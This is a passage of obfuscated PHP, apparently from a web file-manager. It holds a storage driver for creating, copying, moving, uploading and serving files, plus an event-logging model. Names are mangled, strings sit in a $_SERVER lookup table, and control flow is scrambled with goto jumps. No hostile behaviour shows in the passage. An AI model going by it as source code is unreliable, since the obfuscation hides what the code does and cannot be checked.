$C¯òØß¾¯Í[$_SERVER[Æ][461]] : !1; } public function getPathName($AÔàøôÍ¶¸) { $b–©õ»É = $this->infoSimple($AÔàøôÍ¶¸); return $b–©õ»É ? $b–©õ»É[$_SERVER[Æ][28]] : !1; } public function getPathOuter($BÃ¬ê•¤‡›) { if (!$BÃ¬ê•¤‡›) { return $BÃ¬ê•¤‡›; } $BĞšÚôƒÛ¼ = $this->parse($BÃ¬ê•¤‡›); return KodIO::make($BĞšÚôƒÛ¼[$_SERVER[Æ][367]]); } public function copyFolderFromIO($A·–Î–“¬…, $a‰í¾Å¹ÎÄ, $f¢ÏÒ×ïÜª, $f¬Ø¯í®ÁÂ, $C–ĞŸö¨Š©) { $D´Î‰ÚŒøÔ = $this->model->copyFolderFromIO($A·–Î–“¬…, $a‰í¾Å¹ÎÄ, $f¢ÏÒ×ïÜª, $f¬Ø¯í®ÁÂ, $C–ĞŸö¨Š©); return KodIO::make($D´Î‰ÚŒøÔ); } public function isParentOf($b‰ºÁğº¦, $c”’·›»¥¿) { return $this->model->isParentOf($b‰ºÁğº¦, $c”’·›»¥¿); } public function mkfile($bÔñ•Ô‹ã…, $FÀĞ¡à¨Ø = '', $b„ìŠÀ›Ú» = REPEAT_RENAME) { $d®œÔñí©ó =& $_SERVER[Æ]; $D§Åº‘ÖÏ™ = $this->parse($bÔñ•Ô‹ã…); $bÔñ•Ô‹ã… = $D§Åº‘ÖÏ™[$d®œÔñí©ó[367]]; for ($FÂÍ„‹Èä = 0; $FÂÍ„‹Èä < count($D§Åº‘ÖÏ™[$d®œÔñí©ó[1118]]); $FÂÍ„‹Èä++) { $DˆÛ¼ß¹¼š = $D§Åº‘ÖÏ™[$d®œÔñí©ó[1118]][$FÂÍ„‹Èä]; if ($FÂÍ„‹Èä == count($D§Åº‘ÖÏ™[$d®œÔñí©ó[1118]]) - 1) { $bÔñ•Ô‹ã… = $this->model->mkfile($bÔñ•Ô‹ã…, $DˆÛ¼ß¹¼š, $FÀĞ¡à¨Ø, $b„ìŠÀ›Ú»); break; } $bÔñ•Ô‹ã… = $this->model->mkdir($bÔñ•Ô‹ã…, $DˆÛ¼ß¹¼š, REPEAT_SKIP); } return $this->getPathOuter($bÔñ•Ô‹ã…); } public function mkdir($eµª£“ã¯Â, $b¡¶±®æì = REPEAT_SKIP) { $Bê‹¾»Š =& $_SERVER[Æ]; $F°Û©š‹¹¥ = $this->parse($eµª£“ã¯Â); $eµª£“ã¯Â = $F°Û©š‹¹¥[$Bê‹¾»Š[367]]; for ($cÍ›†ôãìÔ = 0; $cÍ›†ôãìÔ < count($F°Û©š‹¹¥[$Bê‹¾»Š[1118]]); $cÍ›†ôãìÔ++) { $Eóø¥ÄÑ» = $F°Û©š‹¹¥[$Bê‹¾»Š[1118]][$cÍ›†ôãìÔ]; $eµª£“ã¯Â = $this->model->mkdir($eµª£“ã¯Â, $Eóø¥ÄÑ», $b¡¶±®æì); } return $this->getPathOuter($eµª£“ã¯Â); } public function copyFile($EÔï¹ÕËĞ, $F¤¦„ĞÅ°, $CÚÊ«ì´˜š = REPEAT_REPLACE) { $d•„¾–Œ =& $_SERVER[Æ]; $AÒËˆ¿§¾Ì = $this->parse($F¤¦„ĞÅ°); $DÛºÃÒùˆ = $this->model->copy($EÔï¹ÕËĞ, $AÒËˆ¿§¾Ì[$d•„¾–Œ[367]], $CÚÊ«ì´˜š, $AÒËˆ¿§¾Ì[$d•„¾–Œ[75]]); return $DÛºÃÒùˆ ? $this->getPathOuter($DÛºÃÒùˆ) : !1; } public function moveFile($cÛİ‘Ö»´È, $Dˆ¢‰£˜ë™, $Cèº¶¢Çº¡ = REPEAT_REPLACE) { $c‚Ë•Êœë‡ =& $_SERVER[Æ]; $f·ö«â—Š¤ = $this->parse($Dˆ¢‰£˜ë™); $Dåœ¾ºá÷  = $this->model->move($cÛİ‘Ö»´È, $f·ö«â—Š¤[$c‚Ë•Êœë‡[367]], $Cèº¶¢Çº¡, $f·ö«â—Š¤[$c‚Ë•Êœë‡[75]]); return $Dåœ¾ºá÷  ? $this->getPathOuter($Dåœ¾ºá÷ ) : !1; } public function copy($cÄöù¤­Ö¢, $fø‘æ–‰Á–, $c±æÄŠŒÈ = REPEAT_REPLACE) { $Dï´…³˜ = $this->parse($fø‘æ–‰Á–); $b—ö³ĞË¬¾ = $this->model->copy($cÄöù¤­Ö¢, $Dï´…³˜[$_SERVER[Æ][367]], $c±æÄŠŒÈ); return $b—ö³ĞË¬¾ ? $this->getPathOuter($b—ö³ĞË¬¾) : !1; } public function move($a†·’º¾, $eÑÕ—øÖ¿Ç, $b”âƒÈß‚Ç = REPEAT_REPLACE) { $Dâ†¯ô…½› = $this->parse($eÑÕ—øÖ¿Ç); $A»µ™¶Í‚• = $this->model->move($a†·’º¾, $Dâ†¯ô…½›[$_SERVER[Æ][367]], $b”âƒÈß‚Ç); return $A»µ™¶Í‚• ? $this->getPathOuter($A»µ™¶Í‚•) : !1; } public function remove($DÂ±ÏáØÜ’, $bŠ…¬ Ïà = true) { return $this->model->remove($DÂ±ÏáØÜ’, $bŠ…¬ Ïà); } public function rename($BÜëï’—, $A‹íŠ…á–š) { $e–„›¬©’» = $this->model->rename($BÜëï’—, $A‹íŠ…á–š); return $e–„›¬©’» ? $this->getPathOuter($BÜëï’—) : $e–„›¬©’»; } public function size($c³äÃĞ†İ“) { $D‘×ª°Ôé¿ = $this->infoSimple($c³äÃĞ†İ“); return $D‘×ª°Ôé¿ ? $D‘×ª°Ôé¿[$_SERVER[Æ][77]] : 0; } public function infoSimple($b¢¾Çº÷ÂŞ) { return $this->model->sourceInfo($b¢¾Çº÷ÂŞ); } public function info($cŠÏÊŠÉ°·) { return $this->infoParse($cŠÏÊŠÉ°·); } public function infoAuth($CÒ‚Šõ—µˆ) { return $this->infoParse($CÒ‚Šõ—µˆ, !1, !0); } public function infoWithChildren($D¤ºÍÕ¸ÔÄ) { return $this->infoParse($D¤ºÍÕ¸ÔÄ, !0); } protected function infoParse($Cê‡˜–ÕŠ¹, $A¶šÆ¨Ğğ = false, $fšŠ—®„°Å = false) { if (!$A¶šÆ¨Ğğ) { return $this->model->pathInfo($Cê‡˜–ÕŠ¹, $fšŠ—®„°Å); } return $this->model->pathInfoMore($Cê‡˜–ÕŠ¹); } public function infoFull($d‡À½ô‡Ş) { $BŸÁ÷Ø·æ =& $_SERVER[Æ]; $dÊ‚”½ßÙÆ = explode($BŸÁ÷Ø·æ[8], $d‡À½ô‡Ş); $fß¤†æ—¶ = implode($BŸÁ÷Ø·æ[8], array_splice($dÊ‚”½ßÙÆ, 1)); return $this->model->pathInfoByPath($dÊ‚”½ßÙÆ[0], $fß¤†æ—¶); } public function hashSimple($aâôá˜Ë‹) { $BªâÍŠÈÍ’ =& $_SERVER[Æ]; $b‹ÍËªÕŸ = $this->infoWithChildren($aâôá˜Ë‹); return $b‹ÍËªÕŸ[$BªâÍŠÈÍ’[162]][$BªâÍŠÈÍ’[164]]; } public function hashMd5($bÓØà«£Š“) { $BÓ‘ïàÖÈ =& $_SERVER[Æ]; $bË”‡ÇŒ‚ª = $this->infoWithChildren($bÓØà«£Š“); return $bË”‡ÇŒ‚ª[$BÓ‘ïàÖÈ[162]][$BÓ‘ïàÖÈ[163]]; } public function exist($EÑ©‚Í©¯Ò) { $C©âï¥£Â =& $_SERVER[Æ]; $Dßµ©ğµ¾ = $this->parse($EÑ©‚Í©¯Ò); if (!$Dßµ©ğµ¾[$C©âï¥£Â[75]]) { return $this->isFile($EÑ©‚Í©¯Ò) || $this->isFolder($EÑ©‚Í©¯Ò); } $bÁ’·¼¾åÌ = array($C©âï¥£Â[368] => $Dßµ©ğµ¾[$C©âï¥£Â[367]], $C©âï¥£Â[28] => $Dßµ©ğµ¾[$C©âï¥£Â[75]]); $f¨íª•‹ÛÎ = $this->model->where($bÁ’·¼¾åÌ)->find(); return $f¨íª•‹ÛÎ ? !0 : !1; } public function isFile($d†×ì×¬êĞ) { $a½šÅ›Ì¦Ë =& $_SERVER[Æ]; $F•æ„İ½ˆ = $this->infoSimple($d†×ì×¬êĞ); return $F•æ„İ½ˆ && $F•æ„İ½ˆ[$a½šÅ›Ì¦Ë[370]] == $a½šÅ›Ì¦Ë[83] ? !1 : !0; } public function isFolder($DìÑ‘ÄŠ´) { $fÀ ë˜âË„ =& $_SERVER[Æ]; $FÖ±¬•­ê = $this->infoSimple($DìÑ‘ÄŠ´); return $FÖ±¬•­ê && $FÖ±¬•­ê[$fÀ ë˜âË„[370]] == $fÀ ë˜âË„[83] ? !0 : !1; } public function listPath($c™ƒÎ—õåË, $dÕ¯’Ûá´Ã = false) { $Dˆ¢‘ŒßÑÆ =& $_SERVER[Æ]; if ($c™ƒÎ—õåË == $Dˆ¢‘ŒßÑÆ[33]) { return !1; } $AºáŠğ÷ÉÉ = array($Dˆ¢‘ŒßÑÆ[368] => $c™ƒÎ—õåË); if ($dÕ¯’Ûá´Ã) { return $this->model->listSource($AºáŠğ÷ÉÉ, -1); } return $this->model->listSource($AºáŠğ÷ÉÉ); } public function has($f°ÜŞ›¦£Ä, $FƒïÒÆî·É = false, $Eñ¿É—ÛÕ = null) { $AŒ×”À§Œ• =& $_SERVER[Æ]; $Aññå‘å– = $this->infoWithChildren($f°ÜŞ›¦£Ä); if ($FƒïÒÆî·É) { return array($AŒ×”À§Œ•[192] => $Aññå‘å–[$AŒ×”À§Œ•[192]], $AŒ×”À§Œ•[191] => $Aññå‘å–[$AŒ×”À§Œ•[191]]); } return $Eñ¿É—ÛÕ ? $Aññå‘å–[$AŒ×”À§Œ•[192]] : $Aññå‘å–[$AŒ×”À§Œ•[191]]; } public function listAll($E½Ãåî Åñ) { $EÀÛ‚¡÷› = IO::info($this->pathParse[$_SERVER[Æ][75]]); if (!$EÀÛ‚¡÷›) { return array(); } return $this->model->listAll($E½Ãåî Åñ); } public function getContent($bĞ‡¹£ç™Ñ) { return $this->model->getContent($bĞ‡¹£ç™Ñ); } public function setContent($DÎ‘¦œ¦Ä, $Aö‰ãË±Ü‚ = '') { return $this->model->setContent($DÎ‘¦œ¦Ä, $Aö‰ãË±Ü‚); } public function fileSubstr($aÊØÑŒ’ò, $FŞ¯÷ÌÓ, $b¶ŒÌ§ÚâØ) { return $this->model->fileSubstr($aÊØÑŒ’ò, $FŞ¯÷ÌÓ, $b¶ŒÌ§ÚâØ); } public function download($Dç¾–É‹Ÿ…, $AŸÒ“æšÆƒ = '') { $B„ïÜ…øƒÚ = get_path_father($AŸÒ“æšÆƒ); $A³—†œ‚† = get_path_this($AŸÒ“æšÆƒ); $FöˆÈä”ç‡ = $this->model->fileInfoGet($Dç¾–É‹Ÿ…); $b‚ñ¶Œ¾èò = IO::copy($FöˆÈä”ç‡[$_SERVER[Æ][75]], $B„ïÜ…øƒÚ, !1, $A³—†œ‚†); return $b‚ñ¶Œ¾èò; } public function upload($d¯–“…˜¶, $b‚ã¾âÏ‘È, $EØŞ¯«Ô÷È = false, $bÖ°Šîã© = REPEAT_REPLACE) { $C¯“Ü£˜¥Ö =& $_SERVER[Æ]; $EÕêéÏ¦„° = $this->parse($d¯–“…˜¶); $dÂ¯Ş„Ü¥Ê = $this->model->addFile($EÕêéÏ¦„°[$C¯“Ü£˜¥Ö[367]], $b‚ã¾âÏ‘È, $EÕêéÏ¦„°[$C¯“Ü£˜¥Ö[75]], $EØŞ¯«Ô÷È, $bÖ°Šîã©); return $this->getPathOuter($dÂ¯Ş„Ü¥Ê); } public function uploadFileByID($E¹œöä…, $A­ÊøæÉÛ, $aòŠîÒ¦¦) { $D…¯¥’ğõÎ =& $_SERVER[Æ]; $C¹‡ÔÛ§ç = $this->parse($E¹œöä…); $f‚ÊÜø¹¹á = $this->model->addFileByFileID($C¹‡ÔÛ§ç[$D…¯¥’ğõÎ[367]], $A­ÊøæÉÛ, $C¹‡ÔÛ§ç[$D…¯¥’ğõÎ[75]], $aòŠîÒ¦¦); return $this->getPathOuter($f‚ÊÜø¹¹á); } public function addFileByRemote($dù‹¹Š‚Ö, $Eè˜‚÷áˆ‰, $f§ˆ¾æÚÓŞ = array(), $fîÙÏƒ”º = '', $bâÆ“ĞÌíŸ) { $EòÒÄ©† =& $_SERVER[Æ]; $BÔíßŠƒ®† = $this->parse($dù‹¹Š‚Ö); $fîÙÏƒ”º = empty($fîÙÏƒ”º) ? $BÔíßŠƒ®†[$EòÒÄ©†[75]] : $fîÙÏƒ”º; $AÇ…ÃôÕÑ = $this->model->addFileByRemote($BÔíßŠƒ®†[$EòÒÄ©†[367]], $Eè˜‚÷áˆ‰, $fîÙÏƒ”º, $f§ˆ¾æÚÓŞ, $bâÆ“ĞÌíŸ); return $this->getPathOuter($AÇ…ÃôÕÑ); } public function uploadLink($Fáä÷„Şå—, $E†øº‹èâ¹ = 0) { $EÌÏ¤Ï…˜Ğ =& $_SERVER[Æ]; $a¯¡§õ¬ = $this->parse($Fáä÷„Şå—); $Fáä÷„Şå— = Model($EÌÏ¤Ï…˜Ğ[544])->createFileName($a¯¡§õ¬[$EÌÏ¤Ï…˜Ğ[75]]); $fØ‹À¶çÖ = IO::uploadLink($Fáä÷„Şå—, $E†øº‹èâ¹); return $fØ‹À¶çÖ; } public function fileNameAuto($fˆõâ‡­Ë®, $AÚ„ô¿Íõ, $e¥°¬ÊÎ‚Ï = REPEAT_REPLACE, $cÙŸºÃ¯—Ç = false) { return $this->model->fileNameAuto($fˆõâ‡­Ë®, $AÚ„ô¿Íõ, $e¥°¬ÊÎ‚Ï, $cÙŸºÃ¯—Ç); } public function fileNameExist($dÂƒÙŸî‘, $b“äŒ¸Ú–) { return $this->model->fileNameExist($dÂƒÙŸî‘, $b“äŒ¸Ú–); } protected function _fileOut($fÏê¯Õ½Õˆ, $Aõô«ËÃ¡’ = false, $DÎ¶éà‚ˆÃ = false, $d¨˜å—Áå = '', $EÌîËåê§ = false) { goto FÄº÷æ«ÄÙ; aÀœïÚ‡„: if ($EÌîËåê§) { return IO::fileOutServer($fœ¡ñøøÛ³[$DñÊÙƒˆñ[75]], $Aõô«ËÃ¡’, $Bâ§ƒŠ‰‹÷, $d¨˜å—Áå); } IO::fileOut($fœ¡ñøøÛ³[$DñÊÙƒˆñ[75]], $Aõô«ËÃ¡’, $Bâ§ƒŠ‰‹÷, $d¨˜å—Áå); goto e®„Ú´‘åì; FÄº÷æ«ÄÙ: $DñÊÙƒˆñ =& $_SERVER[Æ]; $AÌ‡ªİß¶Œ = $this->model->sourceInfo($fÏê¯Õ½Õˆ); if ($AÌ‡ªİß¶Œ[$DñÊÙƒˆñ[370]] == $DñÊÙƒˆñ[83]) { header($DñÊÙƒˆñ[1119]); die; } goto DÏ¨ğ¾¡¨; DÏ¨ğ¾¡¨: $fœ¡ñøøÛ³ = $this->model->fileInfoGet($fÏê¯Õ½Õˆ); $d¨˜å—Áå = $fœ¡ñøøÛ³[$DñÊÙƒˆñ[163]] ? $fœ¡ñøøÛ³[$DñÊÙƒˆñ[163]] : $d¨˜å—Áå; $Bâ§ƒŠ‰‹÷ = isset($GLOBALS[$DñÊÙƒˆñ[1120]]) ? $GLOBALS[$DñÊÙƒˆñ[1120]] : $AÌ‡ªİß¶Œ[$DñÊÙƒˆñ[28]]; goto aÀœïÚ‡„; e®„Ú´‘åì: } public function fileOut($FÎª¸ò·¶©, $d–µñÀ²áÆ = false, $Cë×˜‚ïİ‡ = false, $D¦·ˆ­•¼ = '') { $this->_fileOut($FÎª¸ò·¶©, $d–µñÀ²áÆ, $Cë×˜‚ïİ‡, $D¦·ˆ­•¼); } public function fileOutServer($EĞ‹ßò„¥ä, $f‹•íÇïˆé = false, $BŒŒãÅ‚¨‹ = false, $FÅœ‹Îµ§— = '') { $this->_fileOut($EĞ‹ßò„¥ä, $f‹•íÇïˆé, $BŒŒãÅ‚¨‹, $FÅœ‹Îµ§—, !0); } protected function _fileOutImage($a‚Üö¿œ¤Ä, $cÓ°ğÆİÛ = 250) { $EÚ‹È™ôö =& $_SERVER[Æ]; $f‹´Ü·‚‘Ÿ = $this->model->sourceInfo($a‚Üö¿œ¤Ä); if ($f‹´Ü·‚‘Ÿ[$EÚ‹È™ôö[370]] == $EÚ‹È™ôö[83]) { show_json($EÚ‹È™ôö[1121] . $a‚Üö¿œ¤Ä, !1); } $GLOBALS[$EÚ‹È™ôö[1120]] = $f‹´Ü·‚‘Ÿ[$EÚ‹È™ôö[28]]; $B«ªŸÚä¶Œ = $this->model->fileInfoGet($a‚Üö¿œ¤Ä); IO::fileOutImage($B«ªŸÚä¶Œ[$EÚ‹È™ôö[75]], $cÓ°ğÆİÛ); } public function fileOutImage($A×êÊ±ŒŸÔ, $bŠ½ÍÃì”  = 250) { $this->_fileOutImage($A×êÊ±ŒŸÔ, $bŠ½ÍÃì” ); } public function fileOutImageServer($CÕÇ¯‰†´, $e«·‘à§ÇÌ = 250) { $this->_fileOutImage($CÕÇ¯‰†´, $e«·‘à§ÇÌ); } public function link($a—Œ°°è†Û, $c¼ñ‰’†ãŠ = '') { $a…Æ††ë = $this->model->fileInfoGet($a—Œ°°è†Û); return IO::link($a…Æ††ë[$_SERVER[Æ][75]], $c¼ñ‰’†ãŠ); } protected function parse($bÄ£©ºÂø) { $bï…¬áöĞõ =& $_SERVER[Æ]; if (strstr($bÄ£©ºÂø, $bï…¬áöĞõ[8]) === !1) { return array($bï…¬áöĞõ[385] => intval($bÄ£©ºÂø), $bï…¬áöĞõ[75] => $bï…¬áöĞõ[33], $bï…¬áöĞõ[1118] => array()); } $aª°©ïòÆ = explode($bï…¬áöĞõ[8], trim($bÄ£©ºÂø, $bï…¬áöĞõ[8])); if (count($aª°©ïòÆ) < 2) { show_tips($bÄ£©ºÂø . $bï…¬áöĞõ[1122]); } return array($bï…¬áöĞõ[385] => intval($aª°©ïòÆ[0]), $bï…¬áöĞõ[75] => $aª°©ïòÆ[1], $bï…¬áöĞõ[1118] => array_slice($aª°©ïòÆ, 1)); } } goto DÓ£×İôÓ; CÆÍªÎÁˆØ: class SourceEventModel extends ModelBase { protected $tableName = "\151\x6f\x5f\x73\x6f\165\162\x63\x65\x5f\x65\x76\145\x6e\x74"; protected $dataAuto = array(array("\143\162\145\x61\164\145\124\x69\x6d\x65", "\164\x69\x6d\x65", "\x69\x6e\163\145\x72\x74", "\x66\x75\x6e\x63\164\x69\157\x6e"), array("\144\x65\163\143", '', "\151\156\163\x65\x72\164\x2c\165\160\x64\141\164\145\x2c\x73\145\x6c\145\x63\164", "\152\163\x6f\156")); protected $eventSave = true; public function recodeStop() { $this->eventSave = !1; } public function recodeStart() { $this->eventSave = !0; } public function addEvent($BÀ½ˆ¾÷ó, $EÒè‡«ØØâ, $bàâ“£º¶” = '') { goto bòğà‹À¯¡; bòğà‹À¯¡: $Eï„ÁŠ±° =& $_SERVER[Æ]; if (!$this->eventSave) { return; } $f‰ßò«êë = Model($Eï„ÁŠ±°[1117])->sourceInfo($BÀ½ˆ¾÷ó); goto dğò£Í—±¥; aÖòåğ“‚: $EİİßÄ±¼Ç = array($Eï„ÁŠ±°[383] => $BÀ½ˆ¾÷ó, $Eï„ÁŠ±°[2276] => $f‰ßò«êë[$Eï„ÁŠ±°[461]], $Eï„ÁŠ±°[2277] => $f‰ßò«êë[$Eï„ÁŠ±°[28]], $Eï„ÁŠ±°[466] => $f‰ßò«êë[$Eï„ÁŠ±°[466]], $Eï„ÁŠ±°[1425] => USER_ID, $Eï„ÁŠ±°[388] => $EÒè‡«ØØâ, $Eï„ÁŠ±°[1427] => $bàâ“£º¶”); $this->addSystemLog($EÒè‡«ØØâ, $EİİßÄ±¼Ç); return $this->add($EİİßÄ±¼Ç); goto D„ØòÑìÓ½; dğò£Í—±¥: if (!$f‰ßò«êë) { return !1; } if ($this->isCacheEvent($f‰ßò«êë, $EÒè‡«ØØâ)) { return; } if ($bàâ“£º¶” && is_string($bàâ“£º¶”)) { $bàâ“£º¶” = array($Eï„ÁŠ±°[2131] => $bàâ“£º¶”); } goto aÖòåğ“‚; D„ØòÑìÓ½: } private function addSystemLog($d‹Ü™‡ÎæŞ, $f è­ÊÆÏ‚) { $A†¸¯¶×î =& $_SERVER[Æ]; if ($d‹Ü™‡ÎæŞ == $A†¸¯¶×î[2278]) { $d‹Ü™‡ÎæŞ = $f è­ÊÆÏ‚[$A†¸¯¶×î[405]][$A†¸¯¶×î[2279]]; } else { if (in_array($d‹Ü™‡ÎæŞ, array($A†¸¯¶×î[2078], $A†¸¯¶×î[2280]))) { $d‹Ü™‡ÎæŞ = $f è­ÊÆÏ‚[$A†¸¯¶×î[405]][$A†¸¯¶×î[690]]; } } $D­æÍõá°£ = array_merge($f è­ÊÆÏ‚, array($A†¸¯¶×î[2281] => $f è­ÊÆÏ‚[$A†¸¯¶×î[369]], $A†¸¯¶×î[2282] => $f è­ÊÆÏ‚[$A†¸¯¶×î[2282]])); Model($A†¸¯¶×î[2042])->addLog($A†¸¯¶×î[2283] . $d‹Ü™‡ÎæŞ, $D­æÍõá°£); } private function isCacheEvent($Eà„îòÜ¬ó, $f÷æ±å¥¯) { if ($Eà„îòÜ¬ó[$_SERVER[Æ][371]] == SourceModel::TYPE_SYSTEM) { return !0; } return !1; } public function eventCreate($DìùÀÏØà¢, $Cï¯½×Ìô) { $däĞó¸ØŒÓ =& $_SERVER[Æ]; $Cåğ³¨›ä = Model($däĞó¸ØŒÓ[1117])->sourceInfo($DìùÀÏØà¢); $fªÌÛ÷ù = array($däĞó¸ØŒÓ[2279] => $Cï¯½×Ìô, $däĞó¸ØŒÓ[28] => $Cåğ³¨›ä[$däĞó¸ØŒÓ[28]]); return $this->addEvent($DìùÀÏØà¢, $däĞó¸ØŒÓ[2278], $fªÌÛ÷ù); } public function eventFileEdit($eÜğ÷ÊÑÇ) { $Bèá¼ù· =& $_SERVER[Æ]; $fÉŞ¬Ô¤© = array($Bèá¼ù·[2284] => $_SERVER[$Bèá¼ù·[2285]], $Bèá¼ù·[1748] => strtolower(ACTION)); return $this->addEvent($eÜğ÷ÊÑÇ, $Bèá¼ù·[2069], $fÉŞ¬Ô¤©); } public function eventRecycle($a¬¨ÑœÙË, $fæëÌê»’ä) { return $this->addEvent($a¬¨ÑœÙË, $_SERVER[Æ][2280], $fæëÌê»’ä); } public function eventRemove($a—á²¤±»¢) { $E¬™¤Å¥ =& $_SERVER[Æ]; $aêùÆÊÙ× = Model($E¬™¤Å¥[1117])->sourceInfo($a—á²¤±»¢); $aÓòìÎÈäŠ = $aêùÆÊÙ×[$E¬™¤Å¥[28]]; return $this->addEvent($aêùÆÊÙ×[$E¬™¤Å¥[461]], $E¬™¤Å¥[2068], $aÓòìÎÈäŠ); } public function eventShare($a™¸„áã•, $F§¿Ñí“°Ä) { return $this->addEvent($a™¸„áã•, $_SERVER[Æ][2078], $F§¿Ñí“°Ä); } public function eventMove($e¸ÈøğñÚ›, $EòçÜ”•¦µ, $Cç­ïŒÅ·) { goto Dë¢ÌÚˆ; bÒÜŒÄ§: $this->addEvent($e¸ÈøğñÚ›, $Bƒ£µ³êÈ¬[492], $fŒÛ¨­£×å); $aâ¿¨¶¸‰„ = $E¥ÌÜñòİ->sourceInfo($e¸ÈøğñÚ›); $fŒÛ¨­£×å = array($Bƒ£µ³êÈ¬[369] => $aâ¿¨¶¸‰„[$Bƒ£µ³êÈ¬[369]], $Bƒ£µ³êÈ¬[28] => $aâ¿¨¶¸‰„[$Bƒ£µ³êÈ¬[28]]); goto f¦ÓÕËÒ¼; f¦ÓÕËÒ¼: $this->addEvent($EòçÜ”•¦µ, $Bƒ£µ³êÈ¬[2290], $fŒÛ¨­£×å); goto dÒçÜøß; dùá‡°—¦í: $Bô§ª’Ïº = $E¥ÌÜñòİ->sourceInfo($EòçÜ”•¦µ); $béÜÃÏ·¾Ù = $E¥ÌÜñòİ->sourceInfo($Cç­ïŒÅ·); $fŒÛ¨­£×å = array($Bƒ£µ³êÈ¬[1006] => $EòçÜ”•¦µ, $Bƒ£µ³êÈ¬[2286] => $Bô§ª’Ïº[$Bƒ£µ³êÈ¬[28]], $Bƒ£µ³êÈ¬[2287] => $Bô§ª’Ïº[$Bƒ£µ³êÈ¬[466]], $Bƒ£µ³êÈ¬[1007] => $Cç­ïŒÅ·, $Bƒ£µ³êÈ¬[2288] => $béÜÃÏ·¾Ù[$Bƒ£µ³êÈ¬[28]], $Bƒ£µ³êÈ¬[2289] => $béÜÃÏ·¾Ù[$Bƒ£µ³êÈ¬[466]]); goto bÒÜŒÄ§; Dë¢ÌÚˆ: $Bƒ£µ³êÈ¬ =& $_SERVER[Æ]; $E¥ÌÜñòİ = Model($Bƒ£µ³êÈ¬[1117]); $aâ¿¨¶¸‰„ = $E¥ÌÜñòİ->sourceInfo($e¸ÈøğñÚ›); goto dùá‡°—¦í; dÒçÜøß: } public function eventCopy($AÚ™åÄ…è¤) { $this->eventCreate($AÚ™åÄ…è¤, $_SERVER[Æ][490]); } public function eventRename($F¤Â¤ºŒ¥ˆ, $B¢êñ‹¦íÌ, $A…·Çª«›Â) { $aóÍ‡óƒ¡Ì =& $_SERVER[Æ]; $C´á³á™ğ = array($aóÍ‡óƒ¡Ì[1006] => $B¢êñ‹¦íÌ, $aóÍ‡óƒ¡Ì[1007] => $A…·Çª«›Â); return $this->addEvent($F¤Â¤ºŒ¥ˆ, $aóÍ‡óƒ¡Ì[1129], $C´á³á™ğ); } public function eventAddComment($DÚ˜¡Ç¨, $Câ…†›²÷Á) { return $this->addEvent($DÚ˜¡Ç¨, $_SERVER[Æ][2291], $Câ…†›²÷Á); } public function eventAddDesc($E¦„‚¶âåå, $bØÅƒ‹ »‹) { return $this->addEvent($E¦„‚¶âåå, $_SERVER[Æ][2292], $bØÅƒ‹ »‹); } public function listBySource($dê¸è×¹¥¯) { goto c…‡ø¡»Ù; c‘“ËÔÄßè: $aĞ·¹ğÕŸ = $this->eventListParse($aĞ·¹ğÕŸ, $dê¸è×¹¥¯); show_json($aĞ·¹ğÕŸ); goto Bˆ±ğ™¯; f•§é²œ‰‰: if ($AÕÆì‡»½³[$b‘º÷éïÈŒ[370]] == $b‘º÷éïÈŒ[83]) { $b£–”šÅ¶› = Model($b‘º÷éïÈŒ[1117])->listSearchChildren($dê¸è×¹¥¯, 20000); $b£–”šÅ¶›[] = $dê¸è×¹¥¯ . $b‘º÷éïÈŒ[361]; $A¼çèšæ´ = array($b‘º÷éïÈŒ[369] => array($b‘º÷éïÈŒ[7], $b£–”šÅ¶›)); } $aĞ·¹ğÕŸ = $this->where($A¼çèšæ´)->order($b‘º÷éïÈŒ[2293])->selectPage(); if ($aĞ·¹ğÕŸ[$b‘º÷éïÈŒ[351]][$b‘º÷éïÈŒ[352]] == 0) { $aĞ·¹ğÕŸ[$b‘º÷éïÈŒ[351]][$b‘º÷éïÈŒ[352]] = 1; $aĞ·¹ğÕŸ[$b‘º÷éïÈŒ[354]] = array(array($b‘º÷éïÈŒ[383] => $dê¸è×¹¥¯, $b‘º÷éïÈŒ[2276] => $AÕÆì‡»½³[$b‘º÷éïÈŒ[461]], $b‘º÷éïÈŒ[1425] => $AÕÆì‡»½³[$b‘º÷éïÈŒ[378]], $b‘º÷éïÈŒ[388] => $b‘º÷éïÈŒ[2294], $b‘º÷éïÈŒ[389] => $AÕÆì‡»½³[$b‘º÷éïÈŒ[187]], $b‘º÷éïÈŒ[1427] => $b‘º÷éïÈŒ[33])); } goto c‘“ËÔÄßè; c…‡ø¡»Ù: $b‘º÷éïÈŒ =& $_SERVER[Æ]; $AÕÆì‡»½³ = Model($b‘º÷éïÈŒ[1117])->sourceInfo($dê¸è×¹¥¯); $A¼çèšæ´ = array($b‘º÷éïÈŒ[383] => $dê¸è×¹¥¯); goto f•§é²œ‰‰; Bˆ±ğ™¯: } private function eventListParse($B‰Ó¦—¿„«, $EÚ»ôÇïõŞ) { goto F¥ØÃÜ·‰ø; b‚çÒëÅ‡ˆ: $fÀ„š¸æÉÏ = array_to_keyvalue($EÌ¶ê¦¯ô, $CÑ†ÓË“ÄÍ[33], $CÑ†ÓË“ÄÍ[2282]); foreach ($EÌ¶ê¦¯ô as $DØí¤Ö‘¾¡) { $a¤óæ•è¼á = $DØí¤Ö‘¾¡[$CÑ†ÓË“ÄÍ[405]]; if ($DØí¤Ö‘¾¡[$CÑ†ÓË“ÄÍ[29]] == $CÑ†ÓË“ÄÍ[492] && isset($a¤óæ•è¼á[$CÑ†ÓË“ÄÍ[1006]])) { $A¶é½Â¼¦à[] = $a¤óæ•è¼á[$CÑ†ÓË“ÄÍ[1006]] . $CÑ†ÓË“ÄÍ[33]; $A¶é½Â¼¦à[] = $a¤óæ•è¼á[$CÑ†ÓË“ÄÍ[1007]] . $CÑ†ÓË“ÄÍ[33]; } if ($DØí¤Ö‘¾¡[$CÑ†ÓË“ÄÍ[29]] == $CÑ†ÓË“ÄÍ[2290] && isset($a¤óæ•è¼á[$CÑ†ÓË“ÄÍ[369]])) { $A¶é½Â¼¦à[] = $a¤óæ•è¼á[$CÑ†ÓË“ÄÍ[369]] . $CÑ†ÓË“ÄÍ[33]; } } $A¶é½Â¼¦à = array_merge($A¶é½Â¼¦à, $fÀ„š¸æÉÏ, array($EÚ»ôÇïõŞ . $CÑ†ÓË“ÄÍ[33])); goto Aª”Ò åŞÍ; C—Ú´±ÇºÓ: return $B‰Ó¦—¿„«; goto FÌÆÅ’ÚäÜ; c½†ƒññÊ: $bÜ¢Äöï‰× = Model($CÑ†ÓË“ÄÍ[751])->sourceListInfo($A¶é½Â¼¦à, !0); foreach ($EÌ¶ê¦¯ô as &$DØí¤Ö‘¾¡) { if ($DØí¤Ö‘¾¡[$CÑ†ÓË“ÄÍ[29]] == $CÑ†ÓË“ÄÍ[492] 